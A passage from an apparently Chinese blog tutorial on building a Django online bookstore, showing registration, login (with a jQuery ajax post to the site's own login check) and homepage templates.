class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">label</span>&gt;</span>用户名:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"user_name"</span> <span class="attr">id</span>=<span class="string">"user_name"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"error_tip"</span>&gt;</span>提示信息<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">label</span>&gt;</span>密码:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"pwd"</span> <span class="attr">id</span>=<span class="string">"pwd"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"error_tip"</span>&gt;</span>提示信息<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">label</span>&gt;</span>确认密码:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"cpwd"</span> <span class="attr">id</span>=<span class="string">"cpwd"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"error_tip"</span>&gt;</span>提示信息<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">label</span>&gt;</span>邮箱:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">id</span>=<span class="string">"email"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"error_tip"</span>&gt;</span>提示信息<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"agreement"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"allow"</span> <span class="attr">id</span>=<span class="string">"allow"</span> <span class="attr">checked</span>=<span class="string">"checked"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">label</span>&gt;</span>同意”尚硅谷书城用户使用协议“<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"error_tip2"</span>&gt;</span>提示信息<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"reg_sub"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"注 册"</span> <span class="attr">name</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">                        &#123;&#123;errmsg&#125;&#125;</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock body %&#125;</span><br></pre></td></tr></table></figure></p><p>然后改写login.html<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'base.html' %&#125;</span><br><span class="line">&#123;% load staticfiles %&#125;</span><br><span class="line">&#123;% block title %&#125;尚硅谷书城-登录&#123;% endblock title %&#125;</span><br><span class="line">&#123;% block topfiles %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">'#btnLogin'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 获取用户名和密码</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> username = $(<span class="string">'#username'</span>).val()</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> password = $(<span class="string">'#pwd'</span>).val()</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> csrf = $(<span class="string">'input[name="csrfmiddlewaretoken"]'</span>).val()</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> remember = $(<span class="string">'input[name="remember"]'</span>).prop(<span class="string">'checked'</span>)</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 发起ajax请求</span></span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> params = &#123;</span></span><br><span class="line"><span class="actionscript">                <span class="string">'username'</span>: username,</span></span><br><span class="line"><span class="actionscript">                <span class="string">'password'</span>: password,</span></span><br><span class="line"><span class="actionscript">                <span class="string">'csrfmiddlewaretoken'</span>: csrf,</span></span><br><span class="line"><span class="actionscript">                <span class="string">'remember'</span>: remember</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            $.post(<span class="string">'/user/login_check/'</span>, params, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 用户名密码错误 &#123;'res':0&#125;</span></span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 登录成功 &#123;'res':1&#125;</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">if</span> (data.res == <span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="javascript">                    $(<span class="string">'#username'</span>).next().html(<span class="string">'用户名或密码错误'</span>).show()</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">else</span></span></span><br><span class="line"><span class="undefined">                &#123;</span></span><br><span class="line"><span class="actionscript">                    <span class="comment">// 跳转页面</span></span></span><br><span class="line"><span class="actionscript">                    location.href = data.next_url <span class="comment">// /user/</span></span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">            &#125;)</span></span><br><span class="line"><span class="undefined">        &#125;)</span></span><br><span class="line"><span class="undefined">    &#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;% endblock topfiles %&#125;</span><br><span class="line">&#123;% block header_con %&#125;&#123;% endblock header_con %&#125;</span><br><span class="line">&#123;% block search_bar %&#125;&#123;% endblock search_bar %&#125;</span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login_top clearfix"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.html"</span> <span class="attr">class</span>=<span class="string">"login_logo"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'images/logo.png' %&#125;"</span> <span class="attr">style</span>=<span class="string">"width: 160px; height: 53px;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login_form_bg"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login_form_wrap clearfix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login_banner fl"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"slogan fl"</span>&gt;</span>学计算机 · 来尚硅谷<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login_form fr"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login_title clearfix"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>用户登录<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>立即注册<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form_input"</span>&gt;</span></span><br><span class="line">                    &#123; % csrf_token %&#125;</span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"username"</span> <span class="attr">class</span>=<span class="string">"name_input"</span> <span class="attr">value</span>=<span class="string">"&#123;&#123; username &#125;&#125;"</span> <span class="attr">placeholder</span>=<span class="string">"请输入用户名"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"user_error"</span>&gt;</span>输入错误<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">id</span>=<span class="string">"pwd"</span> <span class="attr">class</span>=<span class="string">"pass_input"</span> <span class="attr">placeholder</span>=<span class="string">"请输入密码"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pwd_error"</span>&gt;</span>输入错误<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"more_input clearfix"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"remember"</span> &#123;&#123; <span class="attr">checked</span> &#125;&#125;&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">label</span>&gt;</span>记住用户名<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>忘记密码<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"btnLogin"</span> <span class="attr">value</span>=<span class="string">"登录"</span> <span class="attr">class</span>=<span class="string">"input_submit"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock body %&#125;</span><br></pre></td></tr></table></figure></p><p>改写index.html<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'base.html' %&#125;</span><br><span class="line">&#123;% load staticfiles %&#125;</span><br><span class="line">&#123;% block title %&#125;尚硅谷书店-首页&#123;% endblock title %&#125;</span><br><span class="line">&#123;% block topfiles %&#125;</span><br><span class="line">&#123;% endblock topfiles %&#125;</span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar_con"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"fl"</span>&gt;</span>全部商品分类<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"navlist fl"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"interval"</span>&gt;</span>|<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>移动端书城<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"interval"</span>&gt;</span>|<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>秒杀<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"center_con clearfix"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"subnav fl"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#model01"</span> <span class="attr">class</span>=<span class="string">"python"</span>&gt;</span>Python<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#model02"</span> <span class="attr">class</span>=<span class="string">"javascript"</span>&gt;</span>Javascript<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#model03"</span> <span class="attr">class</span>=<span class="string">"algorithms"</span>&gt;</span>数据结构与算法<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#model04"</span> <span class="attr">class</span>=<span class="string">"machinelearning"</span>&gt;</span>机器学习<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#model05"</span> <span class="attr">class</span>=<span class="string">"operatingsystem"</span>&gt;</span>操作系统<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#model06"</span> <span class="attr">class</span>=<span class="string">"database"</span>&gt;</span>数据库<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"slide fl"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"slide_pics"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'images/slide.jpg' %&#125;"</span> <span class="attr">alt</span>=<span class="string">"幻灯片"</span> <span class="attr">style</span>=<span class="string">"width: 760px; height: 270px;"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'images/slide02.jpg' %&#125;"</span> <span class="attr">alt</span>=<span class="string">"幻灯片"</span> <span class="attr">style</span>=<span class="string">"width: 760px; height: 270px;"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'images/slide03.jpg' %&#125;"</span> <span class="attr">alt</span>=<span class="string">"幻灯片"</span> <span class="attr">style</span>=<span class="string">"width: 760px; height: 270px;"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'images/slide04.jpg' %&#125;"</span> <span class="attr">alt</span>=<span class="string">"幻灯片"</span> <span class="attr">style</span>=<span class="string">"width: 760px; height: 270px;"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"prev"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"next"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"points"</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"adv fl"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'images/adv01.jpg' %&#125;"</span> <span class="attr">style</span>=<span class="string">"width: 240px; height: 135px;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'images/adv02.jpg' %&#125;"</span> <span class="attr">style</span>=<span class="string">"width: 240px; height: 135px;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"list_model"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"list_title clearfix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">"fl"</span> <span class="attr">id</span>=<span class="string">"model01"</span>&gt;</span>Python<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"subtitle fl"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span>|<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                &#123;% for book in python_new %&#125;</span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'books:detail' books_id=book.id %&#125;"</span>&gt;</span>&#123;&#123; book.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">class</span>=<span class="string">"book_more fr"</span>&gt;</span>查看更多 &gt;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"book_con clearfix"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"book_banner fl"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'images/banner01.jpg' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"book_list fl"</span>&gt;</span></span><br><span class="line">                &#123;% for book in python_hot %&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">h4</span>&gt;</span><span 